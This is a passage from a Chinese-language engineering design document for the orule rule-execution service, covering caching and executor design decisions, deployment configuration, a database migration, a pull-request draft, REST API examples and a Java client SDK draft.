        if (v instanceof ObjectInst) return deepCopy((ObjectInst) v);
        if (v instanceof Collection) return ((Collection<?>) v).stream()
                .map(ObjectInstDeepCopier::copyValue).collect(Collectors.toList());
        if (v instanceof Map) { /* 递归 */ }
        return v;   // String / Number / Boolean 不可变，直接共享
    }
}
```

**SimpleTS 语义对齐**：
- SimpleTS 中的 `order.discount = 30` 是**引用赋值 + 属性修改**，与本决策一致
- 业务方传入 `context` → 执行器修改副本 → 返回新副本，**对原始入参零副作用**

### 13.3 Q3：v1 进程内 LRU 缓存

**决策**：GroovyShell 编译结果（`Script` 对象）使用 **Caffeine LRU 缓存**，最大 1000 条，按 `sourceCodeHash` 索引。

**实现约束**：

```java
@Component
public class GroovyClassCache {

    private final Cache<String, Script> cache = Caffeine.newBuilder()
        .maximumSize(1000)
        .expireAfterAccess(Duration.ofMinutes(10))
        .recordStats()
        .build();

    public Script getOrCompile(String javaSource, GroovyShell shell) {
        String hash = Hashing.sha256()
            .hashString(javaSource, StandardCharsets.UTF_8)
            .toString();
        return cache.get(hash, k -> shell.parse(javaSource));
    }

    public CacheStats stats() {
        return cache.stats();
    }
}
```

**可观测性**：
- Micrometer 指标 `groovy.class.cache.hit.rate` / `groovy.class.cache.size` / `groovy.class.cache.evictions`
- 缓存命中率低于 70% 告警（可能存在规则频繁变更）

**演进路径**：
- v1：进程内 Caffeine（单实例有效）
- v2：评估 Redis（多实例共享 + 持久化），但需评估序列化开销
- v2 决策点：当集群实例数 ≥ 5 且规则代码量大（>10MB）时启动 Redis 评估

### 13.4 Q4：当前分离，v2 抽象 AbstractExecutor

**决策**：v1 保持 `RuleExecutor` 与 `RuleSetExecutor` 接口分离，仅在共享组件（`ExecutorRegistry` / `ExecutionInput` / `ExecutionOutput`）做收敛。

**v1 共享抽象边界**：

```java
// 仅共享执行上下文与执行结果模型
public interface Execution<I extends ExecutionInput, O extends ExecutionOutput> {
    String executorType();
    O execute(I input);
}

// v1 不强制 RuleExecutor / RuleSetExecutor 实现同一接口
// 但所有 Executor 必须实现 executorType() 与 execute(...) 语义契约
```

**v2 抽象计划**：
```java
// v2 演进：抽象出 AbstractExecutor
public abstract class AbstractExecutor<I, O> implements Execution<I, O> {
    protected void preCheck(I input) { /* 公共前置校验 */ }
    protected void postHandle(O output) { /* 公共后置处理（埋点/日志）*/ }
}

// RuleExecutor / RuleSetExecutor 各自继承 AbstractExecutor
```

**v1 不抽象的理由**：
- Rule 同步 / RuleSet 异步，行为差异大
- 抽象过早会引入不必要的耦合
- 业务方当前对分离接口无负面反馈

**v2 触发条件**：
- RuleExecutor 与 RuleSetExecutor 出现 ≥ 3 个共同的前置/后置逻辑
- 或新增第三种执行器（如 BatchRuleExecutor）时

---

## 13. 修订历史

| 版本 | 日期 | 作者 | 变更 |
|------|------|------|------|
| v0.1 | 2026-09-13 | — | 初稿，整合 RFC-0020 / RFC-0021 对外服务化设计 |
| v0.2 | 2026-09-13 | — | Q1~Q4 评审决策落地，新增 §12 决策落地说明 |
| v0.3 | 2026-09-13 | — | 新增 §14 部署与配置、§15 PR 描述草稿 |
| v0.4 | 2026-09-13 | — | 新增 §16 API 示例、§17 客户端 SDK 草案（Java + TypeScript） |
| v0.5 | 2026-09-13 | — | 新增 §18 OWASP 沙箱安全测试、§19 性能压测方案、§20 RFC-0028 契约验证 |
| v0.6 | 2026-09-13 | — | 新增 §21 实施路径（Epic/Story/Task 拆分）+ §22 值班 Runbook |
| v0.6.1 | 2026-09-13 | — | §3.1 / §21 TASK-1.1.1 / PR 草稿：模块名由 `orule-runtime` 改为 `orule-rule-execution-service`，复用现有模块不新建；Spring Boot 入口同步从 `OruleRuntimeApplication` 改为 `RuleExecutionServiceApplication`，Java 包 `com.orule.runtime` → `com.orule.rule.execution` |
| v0.6.2 | 2026-09-13 | — | Sprint 1 起步：TASK-1.1.2 Flyway V1（PG + H2 双库）、TASK-1.1.3 ExecutionLog JPA Entity + Repository、TASK-1.1.4 全部 DTO（RuleExecution/RuleSet 7 个 record + `@Schema`）、TASK-1.1.5 GlobalExceptionHandler + 9 种 §16.6 错误码；新增 springdoc-openapi 2.6.0；@Version 乐观锁移除（§3.3 未定义）；Map<String,Object> 暂替 ObjectInst（RFC-0032 待实施） |
---

## 14. 部署与配置

### 14.1 application.yml 关键配置

```yaml
# === 服务标识 ===
spring:
  application:
    name: rule-execution-service
  profiles:
    active: ${SPRING_PROFILES_ACTIVE:dev}

# === 数据库 ===
  datasource:
    url: jdbc:postgresql://${DB_HOST:localhost}:${DB_PORT:5432}/${DB_NAME:orule}
    username: ${DB_USER:orule}
    password: ${DB_PASSWORD:orule}
    hikari:
      maximum-pool-size: 20
      minimum-idle: 5
      connection-timeout: 5000
  jpa:
    hibernate:
      ddl-auto: validate
    properties:
      hibernate.dialect: org.hibernate.dialect.PostgreSQLDialect
      hibernate.jdbc.time_zone: UTC
  flyway:
    enabled: true
    baseline-on-migrate: true
    locations: classpath:db/migration

# === Redis（v2 启用，v1 留空） ===
  data:
    redis:
      host: ${REDIS_HOST:localhost}
      port: ${REDIS_PORT:6379}
      timeout: 2000ms

# === Kafka ===
kafka:
  bootstrap-servers: ${KAFKA_BOOTSTRAP:localhost:9092}
  producer:
    key-serializer: org.apache.kafka.common.serialization.StringSerializer
    value-serializer: org.springframework.kafka.support.serializer.JsonSerializer
    acks: all
    retries: 3
    properties:
      enable.idempotence: true
  topic:
    rule-set-completed: rule-set-execution-completed

# === Feign 客户端（rule-management-service） ===
feign:
  client:
    config:
      default:
        connect-timeout: 1000
        read-timeout: 2000
        logger-level: BASIC

rule-management:
  base-url: ${RULE_MGMT_URL:http://localhost:8081}

# === 业务配置 ===
orule:
  execution:
    rule-timeout-ms: 5000
    async:
      pool:
        core-size: 20
        max-size: 50
        queue-capacity: 500
        thread-name-prefix: rule-set-exec-
        rejected-execution-handler: CALLER_RUNS
      dispatch-poll-interval-ms: 100
    groovy:
      cache:
        max-size: 1000
        expire-after-access-minutes: 10
    rate-limit:
      enabled: true
      per-tenant-tps: 100
      per-rule-tps: 50

# === 可观测性（依据 RFC-0027） ===
management:
  endpoints:
    web:
      exposure:
        include: health, info, metrics, prometheus
  endpoint:
    health:
      show-details: when-authorized
  tracing:
    sampling:
      probability: 1.0
  metrics:
    distribution:
      percentiles-histogram:
        rule.execution.duration: true
      percentiles:
        rule.execution.duration: 0.5, 0.9, 0.95, 0.99
```

### 14.2 Flyway 迁移脚本

`packages/orule-rule-execution-service/src/main/resources/db/migration/V1__create_execution_log.sql`：

```sql
-- ============================================================
-- V1: 创建 execution_log 表（依据 RFC-0040 §3.3）
-- ============================================================

CREATE TABLE IF NOT EXISTS execution_log (
    id              BIGSERIAL PRIMARY KEY,
    task_id         VARCHAR(64) NOT NULL,
    execution_type  VARCHAR(16) NOT NULL,
    rule_code       VARCHAR(128),
    rule_set_code   VARCHAR(128),
    executor_type   VARCHAR(64) NOT NULL,
    status          VARCHAR(16) NOT NULL,
    input_context   JSONB,
    output_context  JSONB,
    total_count     INTEGER,
    success_count   INTEGER,
    failed_count    INTEGER,
    error_code      VARCHAR(64),
    error_message   TEXT,
    trace_id        VARCHAR(64),
    operator_id     VARCHAR(64),
    tenant_id       VARCHAR(64),
    started_at      TIMESTAMP WITH TIME ZONE,
    finished_at     TIMESTAMP WITH TIME ZONE,
    duration_ms     BIGINT,
    created_at      TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT CURRENT_TIMESTAMP,

    CONSTRAINT uk_exec_task    UNIQUE (task_id),
    CONSTRAINT ck_exec_type    CHECK (execution_type IN ('RULE', 'RULE_SET')),
    CONSTRAINT ck_exec_status  CHECK (status IN ('PENDING', 'RUNNING', 'SUCCESS', 'FAILED', 'PARTIAL_SUCCESS'))
);

CREATE INDEX IF NOT EXISTS idx_exec_task           ON execution_log(task_id);
CREATE INDEX IF NOT EXISTS idx_exec_rule_code      ON execution_log(rule_code);
CREATE INDEX IF NOT EXISTS idx_exec_rule_set_code  ON execution_log(rule_set_code);
CREATE INDEX IF NOT EXISTS idx_exec_tenant_created ON execution_log(tenant_id, created_at DESC);
CREATE INDEX IF NOT EXISTS idx_exec_trace          ON execution_log(trace_id);
CREATE INDEX IF NOT EXISTS idx_exec_status_created ON execution_log(status, created_at DESC);

COMMENT ON TABLE  execution_log IS '规则/规则集执行日志（RFC-0040 §3.3）';
COMMENT ON COLUMN execution_log.task_id        IS '任务 ID（UUID），业务方轮询键';
COMMENT ON COLUMN execution_log.execution_type IS 'RULE 同步单条 / RULE_SET 异步规则集';
COMMENT ON COLUMN execution_log.status         IS 'PENDING/RUNNING/SUCCESS/FAILED/PARTIAL_SUCCESS';
COMMENT ON COLUMN execution_log.input_context  IS '输入 ObjectInst 集合（深拷贝，JSONB 存储）';
COMMENT ON COLUMN execution_log.output_context IS '输出 ObjectInst 集合（含规则修改后的累积状态）';

-- ============================================================
-- 月分区（按 created_at 分区，规避 R-003 表膨胀风险）
-- ============================================================
-- 注：v1.0 暂不分区（数据量小），v1.2 引入以下分区策略：
--
-- ALTER TABLE execution_log PARTITION BY RANGE (created_at);
-- CREATE TABLE execution_log_2026_09 PARTITION OF execution_log
--   FOR VALUES FROM ('2026-09-01') TO ('2026-10-01');
-- CREATE TABLE execution_log_2026_10 PARTITION OF execution_log
--   FOR VALUES FROM ('2026-10-01') TO ('2026-11-01');
```

### 14.3 Docker Compose 部署（开发环境）

```yaml
services:
  rule-execution-service:
    image: orule/rule-execution-service:${VERSION:-latest}
    container_name: rule-execution-service
    ports:
      - "8082:8080"
    environment:
      SPRING_PROFILES_ACTIVE: dev
      DB_HOST: postgres
      DB_PORT: 5432
      DB_NAME: orule
      DB_USER: orule
      DB_PASSWORD: orule
      KAFKA_BOOTSTRAP: kafka:9092
      RULE_MGMT_URL: http://rule-management-service:8081
    depends_on:
      - postgres
      - kafka
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost:8080/actuator/health"]
      interval: 10s
      timeout: 3s
      retries: 5

  postgres:
    image: postgres:15-alpine
    environment:
      POSTGRES_DB: orule
      POSTGRES_USER: orule
      POSTGRES_PASSWORD: orule
    volumes:
      - pgdata:/var/lib/postgresql/data

  kafka:
    image: confluentinc/cp-kafka:7.5.0
    environment:
      KAFKA_ADVERTISED_LISTENERS: PLAINTEXT://kafka:9092
      KAFKA_ZOOKEEPER_CONNECT: zookeeper:2181
    depends_on: [zookeeper]

  zookeeper:
    image: confluentinc/cp-zookeeper:7.5.0

volumes:
  pgdata:
```

### 14.4 启动命令

```bash
# 1. 启动基础设施
docker compose up -d postgres kafka zookeeper

# 2. 启动 rule-management-service（前置依赖）
cd packages/rule-management-service && mvn spring-boot:run &

# 3. 启动 rule-execution-service
cd packages/rule-execution-service && mvn spring-boot:run

# 4. 健康检查
curl http://localhost:8082/actuator/health
# → {"status":"UP"}
```

### 14.5 Kubernetes 部署（生产环境）

`k8s/deployment.yaml` 摘要：

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: rule-execution-service
  namespace: orule
spec:
  replicas: 3
  selector:
    matchLabels: { app: rule-execution-service }
  template:
    metadata:
      labels: { app: rule-execution-service }
    spec:
      containers:
      - name: rule-execution-service
        image: orule/rule-execution-service:v1.0.0
        ports: [{ containerPort: 8080 }]
        env:
        - name: SPRING_PROFILES_ACTIVE
          value: prod
        - name: DB_HOST
          valueFrom: { secretKeyRef: { name: db-secret, key: host } }
        - name: KAFKA_BOOTSTRAP
          value: kafka.orule.svc.cluster.local:9092
        - name: RULE_MGMT_URL
          value: http://rule-management-service.orule.svc.cluster.local:8080
        resources:
          requests: { memory: "1Gi", cpu: "500m" }
          limits:   { memory: "2Gi", cpu: "2000m" }
        livenessProbe:
          httpGet: { path: /actuator/health/liveness, port: 8080 }
          initialDelaySeconds: 30
          periodSeconds: 10
        readinessProbe:
          httpGet: { path: /actuator/health/readiness, port: 8080 }
          initialDelaySeconds: 5
          periodSeconds: 5
---
apiVersion: v1
kind: Service
metadata:
  name: rule-execution-service
  namespace: orule
spec:
  selector: { app: rule-execution-service }
  ports: [{ port: 80, targetPort: 8080 }]
---
apiVersion: autoscaling/v2
kind: HorizontalPodAutoscaler
metadata:
  name: rule-execution-service
  namespace: orule
spec:
  scaleTargetRef:
    apiVersion: apps/v1
    kind: Deployment
    name: rule-execution-service
  minReplicas: 3
  maxReplicas: 10
  metrics:
  - type: Resource
    resource:
      name: cpu
      target: { type: Utilization, averageUtilization: 70 }
```

---

## 15. PR 描述草稿

### Title

```
feat(rule-execution): RFC-0040 规则执行服务（同步单规则 + 异步规则集）
```

### Body

```markdown
## 📋 概述

实现 orule 平台统一的规则执行入口服务 `rule-execution-service`：
- 同步单规则执行（RFC-0020 沙箱 + GroovyShell）
- 异步规则集执行（RFC-0021 + Spring @Async）
- 执行日志持久化与查询
- Kafka 完成事件通知

**关联 RFC**：[RFC-0040](docs/rfcs/RFC-0040-规则执行服务.md)、[RFC-0020](docs/rfcs/RFC-0020-Groovy沙箱单条规则执行器.md)、[RFC-0021](docs/rfcs/RFC-0021-批量规则执行RuleSetArtifact.md)、[RFC-0033](docs/rfcs/RFC-0033-元数据管理2-RuleSetType与RuleType.md)

## 🎯 变更内容

### 新增模块
- `packages/orule-rule-execution-service/`（v0.6 由 `packages/orule-runtime/` 改名而来，端口 8081）
- 12 个核心类（Controller / Service / Executor / Repository / Kafka Producer）
- 1 张数据表 `execution_log`（含索引 + 约束 + 注释）
- 4 个 REST 接口（POST /rule-executions、POST /rule-set-executions、GET /rule-set-executions/{taskId}、GET /executions/{taskId}/logs）

### 技术决策（ADR）
- ✅ ADR-001：默认 GroovyShell，预留 GraalVM 扩展
- ✅ ADR-002：Rule / RuleSet 接口分离
- ✅ ADR-003：execution_log 单表 + 月分区（v1.2 启用）
- ✅ ADR-004：v1 进程内 @Async，v2 引入 Kafka 持久化
- ✅ ADR-005：Feign 客户端 `RuleManagermentApiClient`（拼写保留，待 v2 统一）

### Q1~Q4 评审决策
- Q1：RuleSet 部分失败默认不回滚（保留已成功规则的累积修改）
- Q2：ObjectInst 默认覆盖属性（深拷贝保证调用方零副作用）
- Q3：v1 进程内 Caffeine LRU（最大 1000 条 + 10min TTL）
- Q4：Rule / RuleSet 当前分离，v2 抽象 AbstractExecutor

## ⚠️ 风险与缓解

| 风险 | 等级 | 缓解 |
|------|------|------|
| GroovyShell 沙箱逃逸 | 高 | SecureASTCustomizer + GroovyClassLoader 隔离 + OWASP Top 10 单测 |
| 规则死循环阻塞线程池 | 高 | 5s 超时 + CallerRunsPolicy 拒绝策略 |
| execution_log 表膨胀 | 中 | 月分区（v1.2）+ ES 归档（v2） |
| 异步任务进程崩溃丢失 | 中 | v1 接受丢失，v2 持久化任务表 |

## 🧪 测试覆盖

- 单元测试：`RuleExecutor` / `RuleSetExecutor` / `JavaSourceExecutor` / `GroovyClassCache`（行覆盖 ≥ 80%）
- 集成测试：4 个 Controller 接口 + Service + Repository
- 沙箱安全测试：OWASP Top 10 攻击向量全部拦截（`Runtime.exec` / 反射调用 / 类路径遍历等）
- E2E 测试：CustomerService 调用 → 订单折扣场景，断言输出与预期一致

## 📊 性能指标

| 指标 | 目标 | 实测（待补） |
|------|------|------|
| 单规则 P99 | < 200ms | _CI 跑分后回填_ |
| 规则集 P99（10 条） | < 3s | _CI 跑分后回填_ |
| Groovy 缓存命中率 | ≥ 70% | _Prometheus 查询_ |

## ✅ 验收清单

- [ ] 4 个 REST 接口可调用，OpenAPI 文档生成成功
- [ ] 同步单规则场景：传入 `{ruleCode, context}` → 返回正确 outputContext + taskId
- [ ] 异步规则集场景：提交后立即返回 taskId → 异步查询拿到 PARTIAL_SUCCESS / SUCCESS
- [ ] 沙箱安全测试：所有 OWASP Top 10 攻击向量被拦截
- [ ] 日志表可按 taskId / ruleCode / traceId 查询
- [ ] Kafka 事件 `rule-set-execution-completed` 正常发布
- [ ] Micrometer 指标 `rule.execution.duration` 直方图采集
- [ ] Docker Compose 本地一键启动

## 🔗 依赖项

- 依赖 `rule-management-service` 提供 RuleArtifact / RuleSetArtifact / RuleType 元数据
- 依赖 PostgreSQL 15+（JSONB 字段）
- 依赖 Kafka 2.x（异步完成事件）
- 依赖 Redis（v1 未使用，v2 启用）

## 📝 备注

- ⚠️ Feign 客户端命名 `RuleManagermentApiClient` 保留拼写，v2 评估统一为 `RuleManagement`（单独 RFC 跟踪）
- ⚠️ execution_log v1 不分区，v1.2 引入月分区（迁移脚本已预留，见 §14.2 注释）
- ⚠️ Groovy 沙箱 OWASP 测试套件未合并，本 PR 仅提供接口契约，安全测试在下一 PR 补齐
```

### Checklist

```markdown
- [ ] 代码遵循 AGENTS.md 编码规约（STY-J001 import 风格 / STY-J002 测试类 public）
- [ ] 所有新增 Service 方法含 Javadoc + @Transactional 注解
- [ ] 单元测试覆盖率 ≥ 80%
- [ ] 集成测试在 docker-compose 环境可运行
- [ ] Flyway 迁移脚本可在干净库一键执行
- [ ] application.yml 中所有 ${ENV_VAR} 占位符均在 README 中列出
- [ ] Micrometer 指标命名遵循 `domain.action.metric` 规范
- [ ] 日志中无明文 PII 字段
```

---

## 16. API 示例（cURL + 响应样例）

### 16.1 POST /api/v1/rule-executions（同步单条规则）

#### 场景：VIP 客户订单 8 折

**请求**：

```bash
curl -X POST http://localhost:8082/api/v1/rule-executions \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIs..." \
  -H "X-Tenant-Id: tenant-001" \
  -H "X-Trace-Id: trace-abc-123" \
  -d '{
    "ruleCode": "ORDER_VIP_DISCOUNT",
    "context": {
      "order": {
        "typeCode": "Order",
        "attributes": {
          "id": "ORDER-2026-0001",
          "amount": 1000,
          "discount": 0
        }
      },
      "customer": {
        "typeCode": "Customer",
        "attributes": {
          "id": "CUST-001",
          "level": "VIP",
          "joinYears": 5
        }
      }
    }
  }'
```

**响应（成功）**：

```json
{
  "taskId": "exec-20260913-173920-7f3a2b1c",
  "success": true,
  "outputContext": {
    "order": {
      "typeCode": "Order",
      "attributes": {
        "id": "ORDER-2026-0001",
        "amount": 1000,
        "discount": 200
      }
    },
    "customer": {
      "typeCode": "Customer",
      "attributes": {
        "id": "CUST-001",
        "level": "VIP",
        "joinYears": 5
      }
    }
  },
  "executedAt": "2026-09-13T17:39:20.456Z",
  "durationMs": 23,
  "errorCode": null,
  "errorMessage": null
}
```

**响应（规则编译失败）**：

```json
{
  "taskId": "exec-20260913-174005-9c4d2e8f",
  "success": false,
  "outputContext": {
    "order": { "typeCode": "Order", "attributes": { "id": "ORDER-2026-0002", "amount": 500 } }
  },
  "executedAt": "2026-09-13T17:40:05.123Z",
  "durationMs": 8,
  "errorCode": "EVAL_FAILED",
  "errorMessage": "Script compilation failed at line 12: unable to resolve class com.orule.sdk.Pricing"
}
```

**响应（规则不存在）**：

```http
HTTP/1.1 404 Not Found
Content-Type: application/json

{
  "timestamp": "2026-09-13T17:41:10.000Z",
  "status": 404,
  "error": "RuleNotFoundException",
  "message": "Rule 'ORDER_VIP_DISCOUNT_NOT_EXIST' not found in tenant 'tenant-001'",
  "path": "/api/v1/rule-executions",
  "traceId": "trace-abc-124"
}
```

---

### 16.2 POST /api/v1/rule-set-executions（异步规则集提交）

#### 场景：促销规则集（VIP 折扣 + 满减 + 免运费）

**请求**：

```bash
curl -X POST http://localhost:8082/api/v1/rule-set-executions \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer eyJ..." \
  -H "X-Tenant-Id: tenant-001" \
  -H "X-Trace-Id: trace-xyz-789" \
  -d '{
    "ruleSetCode": "ORDER_PROMOTION_SUITE",
    "context": {
      "order": {
        "typeCode": "Order",
        "attributes": {
          "id": "ORDER-2026-0003",
          "amount": 1500,
          "items": [
            { "sku": "A001", "qty": 2, "price": 500 },
            { "sku": "B002", "qty": 1, "price": 500 }
          ],
          "discount": 0,
          "shippingFee": 50
        }
      },
      "customer": {
        "typeCode": "Customer",
        "attributes": { "level": "VIP", "joinYears": 3 }
      },
      "promotion": {
        "typeCode": "Promotion",
        "attributes": { "active": true, "fullReductionEnabled": true }
      }
    }
  }'
```

**响应（立即返回 PENDING）**：

```json
{
  "taskId": "rs-exec-20260913-175502-1d8e9f0a",
  "status": "PENDING"
}
```

---

### 16.3 GET /api/v1/rule-set-executions/{taskId}（异步结果查询）

#### 场景：轮询上述任务

**请求**：

```bash
curl http://localhost:8082/api/v1/rule-set-executions/rs-exec-20260913-175502-1d8e9f0a \
  -H "Authorization: Bearer eyJ..." \
  -H "X-Tenant-Id: tenant-001"
```

**响应（执行中）**：

```json
{
  "taskId": "rs-exec-20260913-175502-1d8e9f0a",
  "status": "RUNNING",
  "startedAt": "2026-09-13T17:55:02.100Z",
  "finishedAt": null,
  "durationMs": null,
  "totalCount": 3,
  "successCount": 1,
  "failedCount": 0,
  "outputContext": null,
  "errorMessage": null
}
```

**响应（全部成功）**：

```json
{
  "taskId": "rs-exec-20260913-175502-1d8e9f0a",
  "status": "SUCCESS",
  "startedAt": "2026-09-13T17:55:02.100Z",
  "finishedAt": "2026-09-13T17:55:02.480Z",
  "durationMs": 380,
  "totalCount": 3,
  "successCount": 3,
  "failedCount": 0,
  "outputContext": {
    "order": {
      "typeCode": "Order",
      "attributes": {
        "id": "ORDER-2026-0003",
        "amount": 1500,
        "items": [...],
        "discount": 350,
        "shippingFee": 0
      }
    },
    "customer": { "typeCode": "Customer", "attributes": { "level": "VIP", "joinYears": 3 } },
    "promotion": { "typeCode": "Promotion", "attributes": { "active": true, "fullReductionEnabled": true } }
  },
  "errorMessage": null
}
```

**响应（部分失败，对应 Q1 决策不回滚）**：

```json
{
  "taskId": "rs-exec-20260913-175502-1d8e9f0a",
  "status": "PARTIAL_SUCCESS",
  "startedAt": "2026-09-13T17:55:02.100Z",
  "finishedAt": "2026-09-13T17:55:02.480Z",
  "durationMs": 380,
  "totalCount": 3,
  "successCount": 2,
  "failedCount": 1,
  "outputContext": {
    "order": {
      "typeCode": "Order",
      "attributes": {
        "id": "ORDER-2026-0003",
        "amount": 1500,
        "items": [...],
        "discount": 200,
        "shippingFee": 50
      }
    },
    "customer": { "typeCode": "Customer", "attributes": { "level": "VIP", "joinYears": 3 } },
    "promotion": { "typeCode": "Promotion", "attributes": { "active": true, "fullReductionEnabled": true } }
  },
  "errorMessage": "Rule 'PROMOTION_FULL_REDUCTION' failed: division by zero at line 8"
}
```

> 📌 **解读**：满减规则（第 2 条）执行失败，但免运费规则（第 3 条）未执行。VIP 折扣（第 1 条）已成功，`order.discount=200` 保留。业务方订阅 Kafka 事件后触发补偿。

---

### 16.4 GET /api/v1/executions/{taskId}/logs（详细日志）

**请求**：

```bash
curl http://localhost:8082/api/v1/executions/rs-exec-20260913-175502-1d8e9f0a/logs \
  -H "Authorization: Bearer eyJ..."
```

**响应（规则集详细日志）**：

```json
{
  "taskId": "rs-exec-20260913-175502-1d8e9f0a",
  "executionType": "RULE_SET",
  "ruleSetCode": "ORDER_PROMOTION_SUITE",
  "executorType": "java-source",
  "status": "PARTIAL_SUCCESS",
  "inputContext": { "...": "完整输入 context（深拷贝快照）" },
  "outputContext": { "...": "完整输出 context（含规则修改累积）" },
  "totalCount": 3,
  "successCount": 2,
  "failedCount": 1,
  "errorCode": "EVAL_FAILED",
  "errorMessage": "Rule 'PROMOTION_FULL_REDUCTION' failed: division by zero at line 8",
  "traceId": "trace-xyz-789",
  "operatorId": "user-1024",
  "tenantId": "tenant-001",
  "startedAt": "2026-09-13T17:55:02.100Z",
  "finishedAt": "2026-09-13T17:55:02.480Z",
  "durationMs": 380,
  "perRuleExecution": [
    {
      "ruleCode": "PROMOTION_VIP_DISCOUNT",
      "status": "SUCCESS",
      "durationMs": 45,
      "outputSnapshot": { "order.discount": 200 }
    },
    {
      "ruleCode": "PROMOTION_FULL_REDUCTION",
      "status": "FAILED",
      "durationMs": 12,
      "errorCode": "EVAL_FAILED",
      "errorMessage": "division by zero at line 8"
    },
    {
      "ruleCode": "PROMOTION_FREE_SHIPPING",
      "status": "SKIPPED",
      "durationMs": 0,
      "skipReason": "previous rule failed, halt-on-fail flag"
    }
  ]
}
```

> 📌 **注意**：`perRuleExecution` 字段在 v1 中通过 `error_message` JSON 字段嵌套存储（简化表结构），v2 考虑拆分为 `execution_log_detail` 子表。

---

### 16.5 Kafka 完成事件订阅（业务方补偿）

**Topic**：`rule-set-execution-completed`

**事件 schema**（Avro 风格 JSON）：

```json
{
  "eventId": "evt-7a3b2c1d-9e8f",
  "eventType": "RULE_SET_EXECUTION_COMPLETED",
  "occurredAt": "2026-09-13T17:55:02.485Z",
  "taskId": "rs-exec-20260913-175502-1d8e9f0a",
  "ruleSetCode": "ORDER_PROMOTION_SUITE",
  "tenantId": "tenant-001",
  "status": "PARTIAL_SUCCESS",
  "totalCount": 3,
  "successCount": 2,
  "failedCount": 1,
  "durationMs": 380,
  "traceId": "trace-xyz-789",
  "compensationHints": {
    "failedRuleCodes": ["PROMOTION_FULL_REDUCTION"],
    "compensableFields": ["order.discount"],
    "rollbackAvailable": false,
    "suggestedAction": "NOTIFY_USER_AND_RETRY"
  }
}
```

**消费示例**（Java）：

```java
@KafkaListener(topics = "rule-set-execution-completed")
public void onCompleted(RuleSetCompletedEvent event) {
    if ("PARTIAL_SUCCESS".equals(event.status())) {
        compensationService.trigger(
            event.taskId(),
            event.compensationHints().failedRuleCodes()
        );
        // → 业务方决策：是否回滚已应用规则
    }
}
```

---

### 16.6 错误码速查表

| HTTP | errorCode | 含义 | 建议处理 |
|------|-----------|------|---------|
| 200 | — | success=true，正常返回 | — |
| 200 | `EVAL_FAILED` | 规则代码编译/运行异常 | 检查规则代码/SDK 白名单 |
| 200 | `RUNTIME_ERROR` | 规则执行时异常 | 检查规则逻辑/输入数据 |
| 404 | `RULE_NOT_FOUND` | 规则编码不存在 | 校对 ruleCode |
| 404 | `RULE_SET_NOT_FOUND` | 规则集编码不存在 | 校对 ruleSetCode |
| 404 | `TASK_NOT_FOUND` | taskId 不存在 | 校对 taskId（可能过期归档） |
| 429 | `RATE_LIMIT_EXCEEDED` | 触发限流 | 降频重试或申请配额 |
| 500 | `EXECUTOR_NOT_REGISTERED` | executorType 未注册 | 排查 SPI 注册 |
| 500 | `INTERNAL_ERROR` | 系统异常 | 查 traceId 关联日志 |

---

## 17. 客户端 SDK 草案

### 17.1 Java SDK（Maven）

#### Maven 依赖

```xml
<dependency>
    <groupId>com.orule</groupId>
    <artifactId>orule-rule-execution-client</artifactId>
    <version>1.0.0</version>
</dependency>
```

#### 同步调用示例

```java
import com.orule.client.rule.RuleExecutionClient;
import com.orule.client.rule.RuleExecutionException;
import com.orule.common.entity.ObjectInst;
import com.orule.common.entity.RuleExecutionRequest;
import com.orule.common.entity.RuleExecutionResponse;

@Service
public class OrderDiscountService {

    @Autowired
    private RuleExecutionClient ruleClient;   // 自动注入（Spring Boot Starter）

    public Order applyDiscount(Order order, Customer customer) {
        // 1. 构造入参
        Map<String, ObjectInst> context = Map.of(
            "order",    toObjectInst(order),
            "customer", toObjectInst(customer)
        );
        RuleExecutionRequest req = new RuleExecutionRequest("ORDER_VIP_DISCOUNT", context);

        // 2. 同步执行
        RuleExecutionResponse resp;
        try {
            resp = ruleClient.execute(req);
        } catch (RuleExecutionException e) {
            log.error("Rule execution failed: code={}, msg={}", e.getErrorCode(), e.getMessage(), e);
            throw new BusinessException("DISCOUNT_RULE_FAILED", e);
        }

        // 3. 提取输出
        if (!resp.success()) {
            throw new BusinessException("DISCOUNT_RULE_RETURNED_FAILED",
                resp.errorCode() + ": " + resp.errorMessage());
        }
        Order updated = fromObjectInst(resp.outputContext().get("order"));
        return updated;
    }
}
```

#### 异步调用 + 回调示例

```java
@Service
public class PromotionService {

    @Autowired
    private RuleExecutionClient ruleClient;

    public CompletableFuture<PromotionResult> applyPromotion(PromotionContext ctx) {
        Map<String, ObjectInst> context = toContext(ctx);
        RuleSetExecutionRequest req = new RuleSetExecutionRequest("ORDER_PROMOTION_SUITE", context);

        // 1. 提交异步任务
        RuleSetExecutionSubmitResponse submit = ruleClient.submitRuleSet(req);
        String taskId = submit.taskId();
        log.info("Submitted async task: taskId={}", taskId);

        // 2. 轮询结果（指数退避）
        return pollResult(taskId, Duration.ofMillis(100), Duration.ofSeconds(10));
    }

    private CompletableFuture<PromotionResult> pollResult(String taskId, Duration initial, Duration max) {
        return CompletableFuture.supplyAsync(() -> {
            Duration delay = initial;
            while (true) {
                RuleSetExecutionResultResponse r = ruleClient.queryRuleSetResult(taskId);
                if ("PENDING".equals(r.status()) || "RUNNING".equals(r.status())) {
                    sleep(delay);
                    delay = delay.multipliedBy(2).compareTo(max) > 0 ? max : delay.multipliedBy(2);
                    continue;
                }
                return toResult(r);
            }
        }, executor);
    }

    // 3. Kafka 回调（推荐用于生产环境）
    @KafkaListener(topics = "rule-set-execution-completed")
    public void onCompleted(RuleSetCompletedEvent event) {
        if ("PARTIAL_SUCCESS".equals(event.status())) {
            compensationService.trigger(event);
        }
    }
}
```

#### Spring Boot 自动装配

`META-INF/spring/org.springframework.boot.autoconfigure.AutoConfiguration.imports`：

```
com.orule.client.rule.RuleExecutionClientAutoConfiguration
```

`RuleExecutionClientAutoConfiguration.java`：

```java
@AutoConfiguration
@EnableFeignClients(clients = RuleExecutionFeignApi.class)
@Import(RuleExecutionClientConfig.class)
public class RuleExecutionClientAutoConfiguration {

    @Bean
    @ConditionalOnMissingBean
    public RuleExecutionClient ruleExecutionClient(
            RuleExecutionFeignApi feignApi,
            ObjectMapper objectMapper) {
        return new DefaultRuleExecutionClient(feignApi, objectMapper);
    }
}

@ConfigurationProperties(prefix = "orule.rule-execution.client")
@Data
public class RuleExecutionClientConfig {
